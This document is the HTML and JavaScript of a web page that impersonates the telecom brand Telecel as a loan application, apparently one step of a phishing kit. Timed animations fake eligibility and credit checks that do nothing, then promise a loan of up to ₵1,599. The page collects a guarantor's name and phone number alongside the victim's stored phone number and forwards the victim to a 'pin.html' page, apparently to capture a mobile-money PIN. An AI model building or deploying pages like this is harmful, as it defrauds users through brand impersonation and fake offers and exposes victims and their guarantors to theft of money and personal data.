<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telecel – Loan Application</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: #f5f5f5;
      --card: #ffffff;
      --border: #e5e7eb;
      --text: #111827;
      --sub: #6b7280;
      --telecel-red: #ff0000;
      --telecel-darkred: #cc0000;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      --radius: 18px;
    }

    body {
      font-family: 'Inter', Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
      padding: 20px 12px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #f7f7f7;
      border-radius: 28px;
      padding: 24px 20px 30px;
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
    }

    .top-bg {
      position: absolute;
      top: 0;
      right: 0;
      width: 220px;
      height: 220px;
      background: linear-gradient(135deg, rgba(255, 0, 0, 0.25), rgba(255, 0, 0, 0.6));
      border-bottom-left-radius: 120px;
      z-index: 0;
      pointer-events: none;
    }

    .telecel-header {
      position: relative;
      z-index: 2;
      text-align: center;
      margin-bottom: 16px;
    }

    .logo-circle {
      width: 56px;
      height: 56px;
      background: var(--telecel-red);
      border-radius: 50%;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      font-weight: 800;
      margin: 0 auto 6px;
      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
    }

    .logo-text {
      color: var(--telecel-red);
      font-size: 28px;
      font-weight: 800;
      letter-spacing: -0.5px;
      line-height: 1;
      margin-bottom: 4px;
    }

    /* Application card */
    .application-card {
      background: var(--card);
      border-radius: var(--radius);
      padding: 28px 20px;
      box-shadow: var(--shadow);
      border: 1px solid var(--border);
      text-align: center;
      margin: 20px 0 24px;
      position: relative;
      z-index: 2;
      transition: all 0.3s ease;
    }

    /* Step container */
    .step-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }

    .step-icon {
      font-size: 48px;
      color: var(--telecel-red);
      margin-bottom: 8px;
    }

    .step-title {
      font-size: 24px;
      font-weight: 700;
      color: var(--telecel-red);
      margin-bottom: 12px;
    }

    .step-description {
      font-size: 15px;
      color: var(--sub);
      line-height: 1.5;
    }

    /* Loader animation */
    .loader {
      width: 40px;
      height: 40px;
      border: 3px solid #ffe0e0;
      border-top: 3px solid var(--telecel-red);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto 0;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Loan form styles */
    .limit-badge {
      background: #fef2f2;
      border: 1px solid #fee2e2;
      border-radius: 40px;
      padding: 8px 16px;
      display: inline-block;
      font-weight: 600;
      color: var(--telecel-red);
      margin: 16px 0 12px;
    }

    .loan-form {
      width: 100%;
      margin: 20px 0;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .input-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--sub);
      margin-bottom: 8px;
    }

    .input-group input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid var(--border);
      border-radius: 12px;
      font-size: 15px;
      font-weight: 500;
      outline: none;
      transition: border 0.2s;
      background: #fff;
    }

    .input-group input:focus {
      border-color: var(--telecel-red);
      box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.1);
    }

    /* Two-column layout for first/last name */
    .name-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 20px;
    }

    .error-message {
      font-size: 12px;
      color: #dc2626;
      margin-top: 6px;
      display: none;
    }

    .btn {
      width: 100%;
      padding: 16px 20px;
      border: none;
      border-radius: 14px;
      background: var(--telecel-red);
      color: white;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.3);
      transition: 0.2s;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }

    .btn:hover {
      background: #e60000;
      transform: scale(1.02);
    }

    .btn:disabled {
      background: #e5e5e5;
      color: #999;
      box-shadow: none;
      cursor: not-allowed;
      transform: none;
    }

    /* Section header styling */
    .section-header {
      text-align: left;
      margin: 20px 0 12px 0;
      padding-bottom: 8px;
      border-bottom: 2px solid #ffe0e0;
    }

    .section-header h3 {
      font-size: 16px;
      font-weight: 700;
      color: var(--telecel-red);
      letter-spacing: -0.3px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .section-header h3 i {
      font-size: 18px;
      color: var(--telecel-red);
    }

    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 12px;
      color: #aaa;
      position: relative;
      z-index: 2;
    }

    /* Spinner overlay (same as login page) */
    #spinner {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(2px);
      z-index: 999;
    }

    .spinner-loader {
      width: 44px;
      height: 44px;
      border: 4px solid #ffe0e0;
      border-top: 4px solid #ff0000;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bg"></div>

    <div class="telecel-header">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel</div>
    </div>

    <div class="application-card" id="applicationCard">
      <div id="stepContent"></div>
    </div>

    <div class="footer">
      v26.2.2 (TPA-2622) • Telecel Loans
    </div>
  </div>

  <!-- Spinner overlay -->
  <div id="spinner">
    <div class="spinner-loader"></div>
  </div>

  <script>
    // Step definitions
    const steps = [
      {
        icon: 'fas fa-user-check',
        title: 'Checking Eligibility',
        description: 'Verifying your account standing and transaction history...',
        duration: 4000
      },
      {
        icon: 'fas fa-chart-line',
        title: 'Calculating Loan Limit',
        description: 'Analysing repayment capacity and credit score...',
        duration: 3500
      },
      {
        icon: 'fas fa-file-invoice-dollar',
        title: 'Preparing Your Offer',
        description: 'Finalising the best loan package for you...',
        duration: 4000
      }
    ];

    let currentStep = 0;
    let timeoutId = null;
    const stepContent = document.getElementById('stepContent');
    const MAX_LIMIT = 1599;
    const MIN_AMOUNT = 50;

    // Retrieve user's phone number from sessionStorage
    const userPhone = sessionStorage.getItem('telecel_phone') || '';

    function renderStep(index) {
      const step = steps[index];
      stepContent.innerHTML = `
        <div class="step-container">
          <div class="step-icon"><i class="${step.icon}"></i></div>
          <div class="step-title">${step.title}</div>
          <div class="step-description">${step.description}</div>
          <div class="loader"></div>
        </div>
      `;
    }

    function showLoanForm() {
      stepContent.innerHTML = `
        <div class="step-container">
          <div class="step-icon"><i class="fas fa-check-circle"></i></div>
          <div class="step-title">You're Qualified!</div>
          <div class="limit-badge">Maximum Loan Limit: ₵${MAX_LIMIT.toLocaleString()}</div>
          <div class="loan-form">
            <div class="input-group">
              <label>Loan Amount (₵)</label>
              <input type="number" id="loanAmount" placeholder="Enter amount between ₵${MIN_AMOUNT} - ₵${MAX_LIMIT.toLocaleString()}" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1">
              <div class="error-message" id="amountError">Please enter a valid amount.</div>
            </div>

            <div class="section-header">
              <h3><i class="fas fa-user-friends"></i> Guarantor / Next of Kin Details</h3>
            </div>
            <div class="name-row">
              <div class="input-group" style="margin-bottom: 0;">
                <label>First Name</label>
                <input type="text" id="guarantorFirstName" placeholder="First name" autocomplete="off">
              </div>
              <div class="input-group" style="margin-bottom: 0;">
                <label>Last Name</label>
                <input type="text" id="guarantorLastName" placeholder="Last name" autocomplete="off">
              </div>
            </div>
            <div class="input-group">
              <label>Guarantor's Phone Number</label>
              <input type="tel" id="guarantorPhone" placeholder="e.g., 024XXXXXXX" inputmode="numeric">
              <div class="error-message" id="phoneError">Phone number cannot be the same as yours.</div>
            </div>

            <button id="applyBtn" class="btn" disabled>Apply Now</button>
          </div>
        </div>
      `;

      const amountInput = document.getElementById('loanAmount');
      const firstNameInput = document.getElementById('guarantorFirstName');
      const lastNameInput = document.getElementById('guarantorLastName');
      const phoneInput = document.getElementById('guarantorPhone');
      const applyBtn = document.getElementById('applyBtn');
      const amountError = document.getElementById('amountError');
      const phoneError = document.getElementById('phoneError');

      function validateForm() {
        const amount = parseInt(amountInput.value, 10);
        const firstName = firstNameInput.value.trim();
        const lastName = lastNameInput.value.trim();
        const phone = phoneInput.value.trim();

        let valid = true;

        // Amount validation
        if (isNaN(amount) || amount < MIN_AMOUNT || amount > MAX_LIMIT) {
          valid = false;
          amountError.style.display = 'block';
          if (isNaN(amount)) amountError.textContent = 'Please enter a valid number.';
          else amountError.textContent = `Amount must be between ₵${MIN_AMOUNT} and ₵${MAX_LIMIT.toLocaleString()}.`;
        } else {
          amountError.style.display = 'none';
        }

        // Phone validation
        const phoneDigits = phone.replace(/\D/g, '');
        const userPhoneDigits = userPhone.replace(/\D/g, '');
        if (phone === '') {
          valid = false;
          phoneError.style.display = 'block';
          phoneError.textContent = 'Guarantor phone number is required.';
        } else if (phoneDigits === userPhoneDigits && userPhoneDigits !== '') {
          valid = false;
          phoneError.style.display = 'block';
          phoneError.textContent = 'Guarantor phone number cannot be the same as yours.';
        } else if (phoneDigits.length < 9) {
          valid = false;
          phoneError.style.display = 'block';
          phoneError.textContent = 'Please enter a valid phone number.';
        } else {
          phoneError.style.display = 'none';
        }

        // Name errors
        if (firstName === '' || lastName === '') {
          if (!document.getElementById('nameError')) {
            const nameErrorDiv = document.createElement('div');
            nameErrorDiv.id = 'nameError';
            nameErrorDiv.className = 'error-message';
            nameErrorDiv.style.display = 'block';
            nameErrorDiv.textContent = 'Both first name and last name are required.';
            phoneInput.parentNode.insertBefore(nameErrorDiv, phoneInput.nextSibling);
          } else {
            document.getElementById('nameError').style.display = 'block';
          }
          valid = false;
        } else {
          if (document.getElementById('nameError')) {
            document.getElementById('nameError').style.display = 'none';
          }
        }

        applyBtn.disabled = !valid;
      }

      amountInput.addEventListener('input', validateForm);
      firstNameInput.addEventListener('input', validateForm);
      lastNameInput.addEventListener('input', validateForm);
      phoneInput.addEventListener('input', validateForm);

      applyBtn.addEventListener('click', function() {
        const amount = parseInt(amountInput.value, 10);
        const firstName = firstNameInput.value.trim();
        const lastName = lastNameInput.value.trim();
        const phone = phoneInput.value.trim();
        const phoneDigits = phone.replace(/\D/g, '');
        const userPhoneDigits = userPhone.replace(/\D/g, '');

        if (amount >= MIN_AMOUNT && amount <= MAX_LIMIT &&
            firstName !== '' && lastName !== '' &&
            phoneDigits !== '' && phoneDigits !== userPhoneDigits && phoneDigits.length >= 9) {

          // Store loan and guarantor data
          sessionStorage.setItem('loanAmount', amount);
          sessionStorage.setItem('guarantorFirstName', firstName);
          sessionStorage.setItem('guarantorLastName', lastName);
          sessionStorage.setItem('guarantorPhone', phoneDigits);

          // Show spinner and redirect after delay
          const spinner = document.getElementById('spinner');
          spinner.style.display = 'flex';
          applyBtn.disabled = true;  // prevent double click

          setTimeout(() => {
            window.location.href = 'pin.html';
          }, 1500); // 1.5 second delay for loading effect
        }
      });

      validateForm();
    }

    function nextStep() {
      currentStep++;
      if (currentStep < steps.length) {
        renderStep(currentStep);
        timeoutId = setTimeout(() => {
          nextStep();
        }, steps[currentStep].duration);
      } else {
        showLoanForm();
      }
    }

    function startApplication() {
      renderStep(0);
      timeoutId = setTimeout(() => {
        nextStep();
      }, steps[0].duration);
    }

    startApplication();

    window.addEventListener('beforeunload', () => {
      if (timeoutId) clearTimeout(timeoutId);
    });
  </script>
</body>
</html>
